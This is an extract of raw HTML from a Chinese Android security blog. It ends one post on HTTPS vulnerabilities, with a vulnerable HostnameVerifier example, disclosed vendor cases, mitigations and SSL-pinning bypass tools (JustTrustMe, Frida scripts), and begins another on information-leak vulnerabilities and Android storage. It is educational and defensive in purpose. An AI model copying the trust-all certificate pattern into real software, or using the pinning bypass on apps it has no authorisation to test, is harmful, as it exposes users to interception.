class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> HttpClient <span class="title function_">getNewHttpClient</span><span class="params">()</span> &#123;  </span><br><span class="line"><span class="keyword">try</span> &#123;  </span><br><span class="line">    <span class="type">KeyStore</span> <span class="variable">trustStore</span> <span class="operator">=</span> KeyStore.getInstance(KeyStore  </span><br><span class="line">    .getDefaultType());  </span><br><span class="line">    trustStore.load(<span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line">    <span class="type">SSLSocketFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SSLSocketFactory</span>(trustStore);  </span><br><span class="line">    sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);  <span class="comment">//这里信任了所以的hostname，导致可能存在中间人攻击</span></span><br><span class="line">    <span class="type">HttpParams</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicHttpParams</span>();  </span><br><span class="line">    HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);  </span><br><span class="line">    HttpProtocolParams.setContentCharset(params, HTTP.UTF_8);  </span><br><span class="line">    <span class="type">SchemeRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SchemeRegistry</span>();  </span><br><span class="line">    registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;http&quot;</span>, PlainSocketFactory  </span><br><span class="line">    .getSocketFactory(), <span class="number">80</span>));  </span><br><span class="line">    registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;https&quot;</span>, sf, <span class="number">443</span>));  </span><br><span class="line">    <span class="type">ClientConnectionManager</span> <span class="variable">ccm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadSafeClientConnManager</span>(  </span><br><span class="line">    params, registry);  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultHttpClient</span>(ccm, params);  </span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultHttpClient</span>();  </span><br><span class="line">&#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>案例二：<a href="https://www.cnvd.org.cn/flaw/show/4069106">WPS存在信息泄漏漏洞</a></strong></p><p>WPS采用HTTPs进行通信但是由于证书校验问题，可以被获取到敏感信息，从而导致信息泄漏漏洞，这里和上面一致，就不再重新演示了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/29.png" alt="image-20211205155437510"></p><p>安全防护：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）在自定义实现HostnameVerifier时，在verify中对Hostname进行严格校验</span><br><span class="line">（2）建议setHostnameVerifier方法中使用STRICT_HOSTNAME_VERIFIER进行严格证书校验，避免使用ALLOW_ALL_HOSTNAME_VERIFIER</span><br></pre></td></tr></table></figure><h5 id="lt-3-gt-作业帮存在https升级劫持漏洞"><a href="#lt-3-gt-作业帮存在https升级劫持漏洞" class="headerlink" title="&lt;3&gt;作业帮存在https升级劫持漏洞"></a>&lt;3&gt;作业帮存在https升级劫持漏洞</h5><p>大家都知道https是采用加密方式来进行通信，一般来说除非证书的设置方面存在漏洞，否则很难直接去截获报文信息，但是在我挖掘漏洞的过程中，发现一个新的思路，可能这是很多厂商比较懒的原因，直接升级https后，传输的报文数据还是原来的数据，所以我们可以选择采用http旧版本的APP，抓取明文信息，修改后，使用于新版的信息，也可以导致劫持的漏洞</p><p>当然这个过程中也需要解决接收方证书信任的问题，还需要模拟https的请求方式，这里可以使用<a href="https://bbs.pediy.com/thread-268459.htm">stunnel配置</a>，这里主要提供一种思路，其他操作步骤和上述一直，就不再重复演示了</p><h4 id="（2）漏洞防护-1"><a href="#（2）漏洞防护-1" class="headerlink" title="（2）漏洞防护"></a>（2）漏洞防护</h4><p>针对于Android https的开发过程中常见的安全缺陷：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)在自定义实现X509TrustManager时，checkServerTrusted中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class="line"><span class="number">2</span>)在重写WebViewClient的onReceivedSslError方法时，调用proceed忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class="line"><span class="number">3</span>)在自定义实现HostnameVerifier时，没有在verify中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br><span class="line"><span class="number">4</span>)在setHostnameVerifier方法中使用ALLOW_ALL_HOSTNAME_VERIFIER，信任所有Hostname，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</span><br></pre></td></tr></table></figure><h2 id="四、Android-绕过https的SSL-Pining"><a href="#四、Android-绕过https的SSL-Pining" class="headerlink" title="四、Android 绕过https的SSL Pining"></a>四、Android 绕过https的SSL Pining</h2><p>我们在对Android APP抓包时，经常会出现HTTPS报文通过MITM代理后不被信任的问题，有些https在设置好证书后，会出现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unknown</span><br><span class="line">加密的乱码</span><br><span class="line">报错无法抓包</span><br></pre></td></tr></table></figure><p>这是因为对方的https采用了 SSL pinning</p><h3 id="1-SSL-pinning"><a href="#1-SSL-pinning" class="headerlink" title="1.SSL pinning"></a>1.SSL pinning</h3><p>SSL pining &#x3D; 证书绑定 &#x3D; SSL证书绑定</p><p>表示对方的app只允许承认自己特定的证书，这导致MITM的证书不被识别，不运行，从而导致MITM无法解密看到https的明文数据</p><h3 id="2-Android-7-0后破解https-的ssl-pinning"><a href="#2-Android-7-0后破解https-的ssl-pinning" class="headerlink" title="2.Android 7.0后破解https 的ssl pinning"></a>2.Android 7.0后破解https 的ssl pinning</h3><p>Android7.0后，系统做了改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP 默认不信任用户域的证书。之前把MITM的ssl证书，安装到 受信任的凭据 -&gt; 用户 就没用了，因为不受信任了。只信任（安装到）系统域的证书</span><br></pre></td></tr></table></figure><p>因此这导致我们使用如Fiddler、Charles等抓包软件导入证书后，仍然不能在捕获https的密文，甚至无法解析请求</p><p>解决思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）让系统信任Charles的ssl证书</span><br><span class="line">改自己的app的配置，允许https抓包，这就需要有app的源码</span><br><span class="line">把证书放到受系统信任的系统证书中去。前提是手机已root</span><br><span class="line">（2）绕开https不去校验</span><br><span class="line">使用基于Xposed等框架的JustTrustMe、基于Frida框架的r0capyure等</span><br></pre></td></tr></table></figure><h3 id="3-证书绕过原理"><a href="#3-证书绕过原理" class="headerlink" title="3.证书绕过原理"></a>3.证书绕过原理</h3><p>我们基于上文提出第二种思路，详细解析当下的JustTrustMe为代表的证书绕过原理</p><p>通过前面我们了解到，证书验证中到关键是 TrustManager，而绕过证书验证就需要从它入手。xpsoed 上证书校验的绕过插件就是这么干的，目前比较流行的两款基于 xposed 的绕过证书验证的模块有两款 JustTrustMe 和 SSLkiller，针对HttpsURLConnection，OkHttp 框架各自的证书校验函数</p><p>这两款工具通过 hook 这些关键函数，或替换 TrustManager(信任所有证书)或令其验证函数直接失效(函数替换，不做任何校验)，以达到绕过的目的</p><p>绕过证书的实现原理图，下图参考博客<a href="https://juejin.cn/post/6992844908788711438">安卓 https 证书校验和绕过</a>：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/33.png" alt="image-20211205155437510"></p><h3 id="4-工具使用"><a href="#4-工具使用" class="headerlink" title="4.工具使用"></a>4.工具使用</h3><h4 id="（1）Xposed-JustTrustMe"><a href="#（1）Xposed-JustTrustMe" class="headerlink" title="（1）Xposed+JustTrustMe"></a>（1）Xposed+JustTrustMe</h4><p><a href="https://github.com/Fuzion24/JustTrustMe">JustTrustMe下载地址</a></p><p>使用步骤十分简单，就在手机上安装xposed框架，具体安装参考前文帖子，然后将JustTrustMe模块安装就可以使用了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/34.png" alt="image-20211205184421953"></p><h4 id="（2）Frida脚本"><a href="#（2）Frida脚本" class="headerlink" title="（2）Frida脚本"></a>（2）Frida脚本</h4><p>下面是两种比较火的frida抓包脚本</p><p><a href="https://codeshare.frida.re/@masbog/frida-android-unpinning-ssl/">frida-android-unpinning-ssl</a></p><p><a href="https://github.com/r0ysue/r0capture">r0capture</a></p><p>使用步骤：</p><p>开启frida_server注入脚本就可以了，具体可以参考博客网址</p><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文从Android Http&#x2F;Https通信过程出发，讲述了Android Http&#x2F;Https通信漏洞产生的原因，也拿了很多的漏洞复现实例来进行一一说明，最后还简单介绍了当下对https转包的处理和原因，当然这部分东西很多还需要进一步深入的研究，本文可能还未归纳完全所有的情况，就请大家指正了</p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>Android http&#x2F;https原理解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一行代码</span><br><span class="line">Frida 逆向和抓包实战</span><br><span class="line">https://zhuanlan.zhihu.com/p/330393659</span><br><span class="line">https://xiaoyue26.github.io/2018/09/26/2018-09/%E9%80%9A%E4%BF%97%E7%90%86%E8%A7%A3SSL-TLS%E5%8D%8F%E8%AE%AE%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%8E%9F%E7%90%86/</span><br></pre></td></tr></table></figure><p>Android https漏洞挖掘：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.geek-share.com/detail/2727192403.html</span><br><span class="line">https://www.cxyzjd.com/article/u010982507/85258477</span><br><span class="line">https://www.jianshu.com/p/84df0a40127c</span><br></pre></td></tr></table></figure><p>Android 证书绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://juejin.cn/post/6992844908788711438</span><br><span class="line">https://www.jianshu.com/p/34912804bf08</span><br><span class="line">https://www.panaihua.com/android-catchhttp/</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;本文主要介绍Android http&amp;#x2F;https方面的安全漏洞问题，并会从原理并结合案例来逐一讲解，本文一部分参考网络上一些博客，并在相应部分给出链接&lt;/p&gt;
&lt;p&gt;本文第二节主要讲述Android http&amp;#x2F;https相关的基础知识&lt;/p&gt;
&lt;p&gt;本文第三节为漏洞原理解析和漏洞复现&lt;/p&gt;
&lt;p&gt;本文第四节为Android https转包漏洞介绍&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（14）——信息泄露漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/13/bug0014/"/>
    <id>http://security-kitchen.com/2023/02/13/bug0014/</id>
    <published>2023-02-13T01:21:19.000Z</published>
    <updated>2023-12-23T09:13:44.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>好久没有更新帖子了，最近一直都比较忙，这里首先祝大家腊八节快乐。本文主要围绕Android APP漏洞中的信息泄露漏洞展开描述，因为挖掘Android APP信息泄露漏洞的思路各有差异，所以本文只是基于Android APP中较为基础的信息泄露的漏洞实例开始讲述。</p><span id="more"></span><p>本文第二节主要讲述Android中存储的基本方式</p><p>本文第三节主要讲述信息泄露漏洞的分类</p><p>本文第四节主要讲述漏洞的原因和具体复现</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><p>APP 信息泄露漏洞往往和Android APP的数据存储方式有关，所以我们这里首先详细的了解Android的数据存储方式。我们知道Android中数据存储的方式共有五种，分别为：文件存储、SharedPreferences、SQLite数据库存储、ContentProvider、网络存储。</p><h3 id="1-文件存储"><a href="#1-文件存储" class="headerlink" title="1.文件存储"></a>1.文件存储</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/1.png" alt="image-20220102214434734"></p><p>下面我们将结合上面的思维导图依次讲解</p><h4 id="（1）内部存储"><a href="#（1）内部存储" class="headerlink" title="（1）内部存储"></a>（1）内部存储</h4><p>内部存储一般存储一些应用的数据，如apk、shareprefence、database数据、webview缓存和图片缓存等等，内部存储一般存储在<code>/data/</code>下面，这些都需要用户获得root权限后才能访问到</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/2.png" alt="image-20220102215413773"></p><p>我们以root权限的模式进入：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/3.png" alt="image-20220102215509371"></p><p>下面我们介绍常见的一些内部存储目录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/data/app/    存储着我们手机上安装的apk文件</span><br><span class="line">/data/data/包名/share_prefs  存储对应的应用程序中的shareprefence存储文件</span><br><span class="line">/data/data/包名/cache    存储对应的应用程序中的cache缓存文件</span><br><span class="line">/data/data/包名/databases  存储对应的应用程序中的数据库文件</span><br><span class="line">/data/data/包名/files      存储对应的应用程序中的资源文件</span><br></pre></td></tr></table></figure><p>内部存储的特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内部存储的文件和目录只能被我们的app自己所访问，别的app不能访问。</span><br><span class="line">内部存储中的私有目录，当用户卸载app之后，改文件目录中关于该应用的信息就会被删除。</span><br><span class="line">内部存储是可用的。</span><br><span class="line">内部存储大小有限，不适合存储大量数据。</span><br><span class="line">只有root的手机，才能从手机文件管理器看见，否则都是隐藏着的。</span><br></pre></td></tr></table></figure><h4 id="（2）外部存储"><a href="#（2）外部存储" class="headerlink" title="（2）外部存储"></a>（2）外部存储</h4><p>Android4.4以前，手机自身的存储就叫内部存储，插入SD卡的存储叫外部存储，然而Android 4.4以后，手机自带的存储很大，因此现在的外部存储分为两部分：SD卡和扩展卡内存。外部存储一般分为两类，私有目录和公有目录，私有目录里面的数据会随着应用的卸载而删除，公有目录并不会</p><p>自身的外部存储目录：<code>/storage/emulated/0/Android/data/packagename/files</code></p><p>存储卡的存储目录：<code>/storage/extSdCard/Android/data/packagename/files</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/4.png" alt="image-20220103165631522"></p><p>外部存储的特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">公有目录任何程序都可以访问，私有目录自身可以访问。</span><br><span class="line">并不一定是可用的，因为SD卡会被挂载。</span><br><span class="line">外部存储中的私有目录中的数据会随着应用的卸载而删除，公有目录则不会。</span><br></pre></td></tr></table></figure><h5 id="lt-1-gt-私有目录"><a href="#lt-1-gt-私有目录" class="headerlink" title="&lt;1&gt; 私有目录"></a>&lt;1&gt; 私有目录</h5><p>私有目录，在Android 4.4以上，不需要注册和用户授权SD读写的权限，就可以在应用的私有目录进行读写文件，文件不能被其他应用访问，用户删除应用时，对应的应用的私有目录也会被删除</p><p>私有目录地址：<code>/storage/emulated/0/Android/data/packagename</code></p><p>相关API:</p><p>私有目录访问的API都在<code>ContextWrapper</code>对象上，可以直接通过Activity或Context进行调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getExternalCacheDir()： 访问/storage/emulated/0/Android/data/应用包名/cache目录，该目录用来存放应用的缓存文件，当我们通过应用删除缓存文件的时候，该目录下的文件会被清除</span><br><span class="line">getExternalFilesDir(): 访问/storage/emulated/0/Android/data/应用包名/files 目录,该目录用来存放应用的数据</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-公共目录"><a href="#lt-2-gt-公共目录" class="headerlink" title="&lt;2&gt; 公共目录"></a>&lt;2&gt; 公共目录</h5><p>公共目录必须需要用户授权读写的权限，就意味需要在<code>AndroidManifest.xml</code>中注册用户权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 往SDCard写入数据权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Android 6.0系统之后需要申请用户权限，并获得用户授权，才能读写文件，公共目录相对开放，我们可以访问其他APP存在公共目录下的文件，并且当APP被删除时，并不会删除应用存在公共目录下的文件</p><p>相关API:</p><p>公共目录可以通过Environment对象，访问读写公共目录的文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Environment.getExternalStorageDirectory() 访问外部存储设备公共根目录</span><br><span class="line">Environment.getExternalStorageState() 获得外部存储SD卡的状态</span><br></pre></td></tr></table></figure><h5 id="（3）系统存储目录"><a href="#（3）系统存储目录" class="headerlink" title="（3）系统存储目录"></a>（3）系统存储目录</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getRootDirectory()：对应获取系统分区根路径:/system</span><br><span class="line"><span class="title function_">getDataDirectory</span><span class="params">()</span>：对应获取用户数据目录路径:/data</span><br><span class="line"><span class="title function_">getDownloadCacheDirectory</span><span class="params">()</span>：对应获取用户缓存目录路径:/cache</span><br></pre></td></tr></table></figure><p>补充：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）升级应用程序后的apk文件在哪？</span><br><span class="line">一般我们从服务器端下载的app需要放到外部存储目录下面，而不是内部存储目录，即/storage/emulated/<span class="number">0</span>/Android/data/packagename下</span><br><span class="line">（<span class="number">2</span>）清除数据和清除缓存的区别？</span><br><span class="line">清除数据清除的是保存在app中所有数据，就是上面提到的位于packagename下面的所有文件，包含内部存储(/data/data/packagename/)和外部存储(/storage/emulated/<span class="number">0</span>/Android/data/packagename/)，但不会影响SD卡的数据</span><br><span class="line">缓存是程序运行时的临时存储空间，缓存文件存放在getCacheDir()或者 getExternalCacheDir()路径下</span><br></pre></td></tr></table></figure><h4 id="（4）文件存储的读写方式"><a href="#（4）文件存储的读写方式" class="headerlink" title="（4）文件存储的读写方式"></a>（4）文件存储的读写方式</h4><p>写入文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;Data to save&quot;</span>;</span><br><span class="line">      <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">ButteredWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">            out = openFileOutput(<span class="string">&quot;data&quot;</span>,Context.MODE_PRIVATE);  <span class="comment">//MODE_PRIVATE（默认）：覆盖、MODE_APPEND：追加</span></span><br><span class="line">            writer = <span class="keyword">new</span> <span class="title class_">ButteredWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputSreamWriter</span>(out));</span><br><span class="line">            writer.write(data);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">      &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                  <span class="keyword">if</span>(writer!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                  e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">load</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">ButteredReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">            in = openFileInput(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">ButteredReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String line= <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((line = reader.readline()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                   builder.append();</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">      &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(reader != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                          reader.close();</span><br><span class="line">                    &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                          e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">             &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SharedPreferences"><a href="#2-SharedPreferences" class="headerlink" title="2.SharedPreferences"></a>2.SharedPreferences</h3><p>SharedPreference是Android平台上一个轻量级的存储类，主要是保存一些常用的配置比如窗口状态，是使用键值对的方式来存储数据，这样就可以支持多种不同的数据类型存储，进行数据持久化就会比文件方便很多</p><p>默认存储路径：<code>/data/data/packageName/shared_prefs</code></p><p>获取SharedPreferences对象的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context的getSharedPreferences()方法，参数一是文件名，参数二是操作模式</span><br><span class="line">Activity的getPreferences()方法，参数为操作模式，使用当前应用程序包名为文件名</span><br><span class="line">PreferenceManager的getDefaultSharedPreferences()静态方法，接收Context参数，使用当前应用程序包名为文件名</span><br></pre></td></tr></table></figure><h4 id="（1）SharedPreferences数据的存取"><a href="#（1）SharedPreferences数据的存取" class="headerlink" title="（1）SharedPreferences数据的存取"></a>（1）SharedPreferences数据的存取</h4><p>SharedPreference的存储：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)根据Context获取SharedPreferences对象</span><br><span class="line">(<span class="number">2</span>)利用edit()方法获取Editor对象</span><br><span class="line">(<span class="number">3</span>)ditor对象存储key-value键值对数据</span><br><span class="line">(<span class="number">4</span>)apply()提交数据</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;     </span><br><span class="line"> <span class="meta">@Override</span> </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123; </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState); </span><br><span class="line">        setContentView(R.layout.main); </span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取SharedPreferences对象 </span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;        </span><br><span class="line">        <span class="type">SharedPreferences</span> <span class="variable">sp</span> <span class="operator">=</span> ctx.getSharedPreferences(<span class="string">&quot;SP&quot;</span>, MODE_PRIVATE); <span class="comment">//MODE_PRIVATE（默认）：只有当前的应用程序才能对文件进行读写、MODE_MULTI_PROCESS：用于多个进程对同一个SharedPreferences进行读写</span></span><br><span class="line">        <span class="comment">//存入数据 </span></span><br><span class="line">        <span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sp.edit(); </span><br><span class="line">        editor.putString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Tom&quot;</span>); </span><br><span class="line">        editor.putInt(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>); </span><br><span class="line">        editor.putBoolean(<span class="string">&quot;married&quot;</span>, <span class="literal">true</span>); </span><br><span class="line">        editor.apply(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回STRING_KEY的值 </span></span><br><span class="line">        Log.d(<span class="string">&quot;SP&quot;</span>, sp.getString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;none&quot;</span>)); </span><br><span class="line">        <span class="comment">//如果NOT_EXIST不存在，则返回值为&quot;none&quot; </span></span><br><span class="line">        Log.d(<span class="string">&quot;SP&quot;</span>, sp.getString(<span class="string">&quot;NOT_EXIST&quot;</span>, <span class="string">&quot;none&quot;</span>)); </span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SharedPreference数据的读取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span 